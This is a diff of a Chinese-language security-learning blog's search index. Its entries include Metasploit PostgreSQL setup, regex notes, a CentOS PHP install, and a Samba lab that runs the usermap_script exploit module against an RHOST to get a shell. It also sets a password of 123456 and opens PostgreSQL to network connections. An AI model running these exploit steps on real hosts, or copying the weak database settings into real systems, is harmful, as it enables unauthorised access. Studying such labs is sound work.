+    <content><![CDATA[<h2 id="metasploit之PostgreSQL"><a href="#metasploit之PostgreSQL" class="headerlink" title="metasploit之PostgreSQL"></a>metasploit之PostgreSQL</h2><h3 id="目的：-Metasploit自带数据库（PostgreSQL）操作"><a href="#目的：-Metasploit自带数据库（PostgreSQL）操作" class="headerlink" title="目的： Metasploit自带数据库（PostgreSQL）操作"></a>目的： Metasploit自带数据库（PostgreSQL）操作</h3><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p><code>db_status</code>     查看数据库连接状态</p>
+<p><code>db_connect</code>  链接数据库</p>
+<p><code>db_disconnect</code>    断开连接</p>
+<p><code>vulns</code>     查看数据库扫描的主机的漏洞</p>
+<p><code>workspace</code>   工作空间，相对于独立的</p>
+<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msfconsole,<code>db_status</code>查看数据库连接状态，如果已连接执行<code>db_disconnect</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/1.PNG"></p>
+<p>exit退出软件，执行<code>service postgresql start</code>,启动数据库，<code>netstat -ntlp | grep postgre</code>查询是否启动成功，端口为<code>5432</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/2.PNG"></p>
+<p>重新运行msf,<code>db_status</code>查看是否连接<code>数据库</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/3.PNG"></p>
+<p><code>db_disconnect</code>断开连接，<code>db_status</code>查看连接状态</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/4.PNG"></p>
+<p>手动使用命令连接数据库，须知<code>数据库名</code>，<code>用户名</code>，<code>ip</code>以及<code>密码</code>，新建窗口，查询数据库配置文件，执行<code>find / -name database.yml</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/5.PNG"></p>
+<p><code>cat /usr/share/metasploit-framework/config/database.yml</code>，查看配置文件</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/6.PNG"></p>
+<p>返回msf界面，db_connect查看使用方法，选择第二种<code>db_connect 用户名:密码@ip/数据库名</code>，配置信息是<code>development</code>标签内的</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/7.PNG"><br><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/8.PNG"></p>
+<p>退出msf，执行<code>su postgres</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/9.PNG"></p>
+<p>创建新用户sub1及密码：<code>createuser sub1 -P</code>,回车并输入密码123456两次，<code>createdb --owner=sub1 test</code>连接数据库test，完成后exit退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/10.PNG"></p>
+<p>运行msfconsole，db_disconnect断开连接，执行<code>db_connect sub1:123456@localhost/test</code>连接刚才的数据库，<code>db_status</code>查看状态</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/11.PNG"></p>
+<p>退出msf,编辑<code>/etc/postgresql/9.5/main/postgresql.conf</code>文件，<code>shift+：</code>输入<code>set number</code>调出行号</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/12.PNG"></p>
+<p>找到59行，将#去掉，并且把<code>localhost</code>改为*，88行去掉#,然后保存退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/13.PNG"></p>
+<p>编辑<code>/etc/postgresql/9.5/main/pg_hba.conf</code>,最后一行添加<code>host all all 0.0.0.0/32 md5</code>，保存退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/14.PNG"></p>
+<p><code>service postgresql restart</code>，重启服务</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/15.PNG"></p>
+<p>打开msf，<code>workspace --help</code>查看用法</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/16.PNG"></p>
+<p><code>workspace -v</code>查看工作空间，只有默认的一个</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/17.PNG"></p>
+<p><code>worksapce -a 1</code>,<code>workspace -a 2</code> 添加工作空间1，2，执行<code>workspace -v</code> 查看工作空间</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/18.PNG"></p>
+<p><code>workspace -d 1</code>删除工作空间1，执行<code>workspace -v</code> 查看现有工作空间</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/19.PNG"></p>
+<p><code>workspace 2</code>切换到工作空间2</p>
+<p><code>workspace -d 2</code>删除工作空间2,自动切换到默认工作空间</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/20.PNG"></p>
+]]></content>
+      <tags>
+        <tag>msf</tag>
+        <tag>PostgreSQL</tag>
       </tags>
   </entry>
   <entry>
@@ -706,24 +683,6 @@
       </tags>
   </entry>
   <entry>
-    <title>samba提权</title>
-    <url>/blog/2021/12/20/samba%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<h2 id="samba提权"><a href="#samba提权" class="headerlink" title="samba提权"></a>samba提权</h2><h3 id="利用samba漏洞，获得目标主机root权限"><a href="#利用samba漏洞，获得目标主机root权限" class="headerlink" title="利用samba漏洞，获得目标主机root权限"></a>利用samba漏洞，获得目标主机root权限</h3><h4 id="原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"><a href="#原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。" class="headerlink" title="原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"></a>原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。</h4><h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><p>确定目标存在<code>445</code>和<code>139</code>端口开放，使用msf，输入命令<code>search samba</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220184011444.png" alt="image-20211220184011444"></p>
-<p>使用命令<code>use exploit/multi/samba/usermap_script</code>，启用漏洞利用模块，终端输入<code>info</code>，查看相关信息</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220184341512.png" alt="image-20211220184341512"></p>
-<p>输入<code>set RHOST ip</code>,设置目标ip地址，输入<code>exploit</code>，开始攻击，攻击成功后，建立会话</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220190130652.png" alt="image-20211220190130652"></p>
-<p>输入<code>whoami</code>查看权限，输入<code>ifconfig</code>，查看系统网络信息</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220190258566.png" alt="image-20211220190258566"></p>
-<p>实验完成</p>
-]]></content>
-      <tags>
-        <tag>samba</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入</title>
     <url>/blog/2021/12/28/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="sql-注入"><a href="#sql-注入" class="headerlink" title="sql 注入"></a>sql 注入</h2><h3 id="一般过程"><a href="#一般过程" class="headerlink" title="一般过程"></a>一般过程</h3><ol>
@@ -873,6 +832,24 @@
       <tags>
         <tag>sql</tag>
         <tag>注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>samba提权</title>
+    <url>/blog/2021/12/20/samba%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h2 id="samba提权"><a href="#samba提权" class="headerlink" title="samba提权"></a>samba提权</h2><h3 id="利用samba漏洞，获得目标主机root权限"><a href="#利用samba漏洞，获得目标主机root权限" class="headerlink" title="利用samba漏洞，获得目标主机root权限"></a>利用samba漏洞，获得目标主机root权限</h3><h4 id="原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"><a href="#原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。" class="headerlink" title="原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"></a>原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。</h4><h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><p>确定目标存在<code>445</code>和<code>139</code>端口开放，使用msf，输入命令<code>search samba</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220184011444.png" alt="image-20211220184011444"></p>
+<p>使用命令<code>use exploit/multi/samba/usermap_script</code>，启用漏洞利用模块，终端输入<code>info</code>，查看相关信息</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220184341512.png" alt="image-20211220184341512"></p>
+<p>输入<code>set RHOST ip</code>,设置目标ip地址，输入<code>exploit</code>，开始攻击，攻击成功后，建立会话</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220190130652.png" alt="image-20211220190130652"></p>
+<p>输入<code>whoami</code>查看权限，输入<code>ifconfig</code>，查看系统网络信息</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220190258566.png" alt="image-20211220190258566"></p>
+<p>实验完成</p>
+]]></content>
+      <tags>
+        <tag>samba</tag>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
@@ -1139,25 +1116,6 @@
       </tags>
   </entry>
   <entry>
-    <title>正则表达式</title>
-    <url>/blog/2021/11/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
-    <content><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>.表示任意单个字符（除了换行符）</p>
-<p>[]表示里面的任何一个字符</p>
-<p>a{1，5}表示a有1到5之间个字符</p>
-<p>{0，}表示0个或者无穷个</p>
-<p>*表示{0，}</p>
-<p>+表示{1，}</p>
-<p>？表示{0，1}</p>
-<p>[^a,b,c]表示除了a,b,c的其他字符</p>
-<p>^是字符串开头</p>
-<p>$是字符串结尾</p>
-<p>（？&lt;=（a））表示以a开头</p>
-<p>（？=（a））表示以a结尾</p>
-<p>\d , \w  , \ s 匹配数字，字符，空格</p>
-<p>\D , \W  ,\S 匹配非数字，非字符，非空格</p>
-]]></content>
-  </entry>
-  <entry>
     <title>绕过content_type检测文件类型上传webshell</title>
     <url>/blog/2021/12/27/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/</url>
     <content><![CDATA[<h2 id="绕过content-type检测文件类型上传webshell"><a href="#绕过content-type检测文件类型上传webshell" class="headerlink" title="绕过content_type检测文件类型上传webshell"></a>绕过content_type检测文件类型上传webshell</h2><p>目的:</p>
@@ -1198,6 +1156,25 @@
         <tag>webshell</tag>
         <tag>content_type</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>正则表达式</title>
+    <url>/blog/2021/11/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
+    <content><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>.表示任意单个字符（除了换行符）</p>
+<p>[]表示里面的任何一个字符</p>
+<p>a{1，5}表示a有1到5之间个字符</p>
+<p>{0，}表示0个或者无穷个</p>
+<p>*表示{0，}</p>
+<p>+表示{1，}</p>
+<p>？表示{0，1}</p>
+<p>[^a,b,c]表示除了a,b,c的其他字符</p>
+<p>^是字符串开头</p>
+<p>$是字符串结尾</p>
+<p>（？&lt;=（a））表示以a开头</p>
+<p>（？=（a））表示以a结尾</p>
+<p>\d , \w  , \ s 匹配数字，字符，空格</p>
+<p>\D , \W  ,\S 匹配非数字，非字符，非空格</p>
+]]></content>
   </entry>
   <entry>
     <title>绕过前台脚本检测扩展名上传webshell</title>
@@ -1262,6 +1239,29 @@
 ]]></content>
       <tags>
         <tag>-webshell -前端</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>centos7安装php</title>
+    <url>/blog/2021/11/24/centos7%E5%AE%89%E8%A3%85php/</url>
+    <content><![CDATA[<h2 id="centos7安装php"><a href="#centos7安装php" class="headerlink" title="centos7安装php"></a>centos7安装php</h2><p>环境是apache2+mariadb+php</p>
+<p>先安装php</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php</span></span><br></pre></td></tr></table></figure>
+
+<p>安装php相关组件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php-mysql php-gd php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-bcmath php-mhash</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl restart mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl restart httpd</span></span><br></pre></td></tr></table></figure>
+
+<p>通过php -v 查看信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/var/www/html#</span><span class="bash"> php -v</span></span><br><span class="line">PHP 5.4.16 (cli) (built: Apr  1 2020 04:07:17)</span><br><span class="line">Copyright (c) 1997-2013 The PHP Group</span><br><span class="line">Zend Engine v2.4.0, Copyright (c) 1998-2013 Zend Technologies</span><br></pre></td></tr></table></figure>
+
+<p>进入/var/www/html目录编写一个测试页面</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/var/www/html#</span><span class="bash"> vim index.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后访问页面，有php相关信息成功</p>
+]]></content>
+      <tags>
+        <tag>centos7</tag>
+        <tag>php</tag>
       </tags>
   </entry>
   <entry>
